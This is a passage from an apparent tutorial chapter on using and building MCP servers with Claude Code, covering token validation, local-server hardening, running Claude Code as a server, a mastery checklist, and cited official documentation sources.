- **Keep results small.** Paginate, filter server-side, return what's needed. Annotate genuinely-large-but-necessary outputs with `anthropic/maxResultSizeChars` rather than forcing users to raise `MAX_MCP_OUTPUT_TOKENS`. [^1]
- **Validate tokens (HTTP servers).** Audience-check every inbound token; reject any not issued for you; never pass a client's token downstream. [^6]
- **Harden local servers.** Prefer stdio, which limits access to just the client; if you must use HTTP locally, require an authorization token or a Unix domain socket. [^6]
- **Use the client primitives when they fit.** Need an LLM call without bundling a model SDK? Use **sampling**. Need a value from the user mid-task? Use **elicitation** (renders as a Claude Code dialog). [^2]

### Claude Code as a server

`claude mcp serve` exposes Claude Code's own tools (View, Edit, LS, ...) as a stdio MCP server other hosts can connect to (e.g. Claude Desktop). Your *client* is then responsible for per-tool-call confirmation. Point `command` at the full `claude` path if it isn't on PATH (`which claude`), or you'll hit `spawn claude ENOENT`. [^1]

---

## 9.10 Mastery checklist

- [ ] You can state the **one-line heuristic** ("stop pasting, connect a server") and the four-way split (MCP=access vs skill=expertise vs subagent=isolation vs hook=guardrail).
- [ ] You can name the three server primitives **by who controls them** (tool=model, resource=app/user, prompt=user) and how each surfaces in Claude Code (`mcp__s__t`, `@s:proto://path`, `/mcp__s__prompt`).
- [ ] You pick **stdio vs HTTP** by location+clients and know HTTP is the only OAuth-capable transport; you know SSE-standalone is deprecated.
- [ ] You know the **three scopes**, that `.mcp.json` is the committed/team one, that precedence doesn't merge, and that secrets go in `${VAR}`, not the file.
- [ ] You can explain **OAuth 2.1 + PKCE (S256)**, RFC 9728 discovery, RFC 8707 audience binding, and why **token passthrough is forbidden**.
- [ ] You **review `.mcp.json` like code**, reading every stdio `command`/`args`/`env` and every remote URL+scope, and you know managed-MCP allow/deny enforcement requires `serverUrl`/`serverCommand`, not `serverName`.
- [ ] You reach for **tool search** (and, at scale, **code execution with MCP**) to keep context cheap, and you know the Haiku/Vertex/proxy caveats.
- [ ] You can decide **when to build a server** (external + reusable + worth the overhead) and scaffold one with `mcp-server-dev`.

---

## Sources

Official Anthropic, all fetched 2026-06-18:
- Connect Claude Code to tools via MCP -- https://code.claude.com/docs/en/mcp
- Managed MCP and enterprise control -- https://code.claude.com/docs/en/managed-mcp
- CLI reference (`--mcp-config`, `--strict-mcp-config`) -- https://code.claude.com/docs/en/cli-reference
- Skills explained (MCP vs. skill vs. subagent framing) -- https://claude.com/blog/skills-explained
- Code execution with MCP -- https://www.anthropic.com/engineering/code-execution-with-mcp
- Changelog (re-verify version-pinned details) -- https://code.claude.com/docs/en/changelog.md

Model Context Protocol spec, all fetched 2026-06-18:
- Architecture -- https://modelcontextprotocol.io/docs/learn/architecture
- Client concepts -- https://modelcontextprotocol.io/docs/learn/client-concepts
- Authorization (spec revision 2025-11-25) -- https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization
- Security best practices -- https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices
- Latest specification (re-verify the protocol revision) -- https://modelcontextprotocol.io/specification/latest

[^1]: web | 2026-06-18 | [https://code.claude.com/docs/en/mcp](https://code.claude.com/docs/en/mcp)
[^2]: web | 2026-06-18 | [https://modelcontextprotocol.io/docs/learn/architecture](https://modelcontextprotocol.io/docs/learn/architecture)
[^3]: web | 2026-06-18 | [https://claude.com/blog/skills-explained](https://claude.com/blog/skills-explained)
[^4]: web | 2026-06-18 | [https://modelcontextprotocol.io/docs/learn/client-concepts](https://modelcontextprotocol.io/docs/learn/client-concepts)
[^5]: web | 2026-06-18 | [https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization)
[^6]: web | 2026-06-18 | [https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices)
[^7]: web | 2026-06-18 | [https://www.anthropic.com/engineering/code-execution-with-mcp](https://www.anthropic.com/engineering/code-execution-with-mcp)
[^8]: web | 2026-06-18 | [https://code.claude.com/docs/en/managed-mcp](https://code.claude.com/docs/en/managed-mcp)
[^9]: web | 2026-06-18 | [https://code.claude.com/docs/en/cli-reference](https://code.claude.com/docs/en/cli-reference)
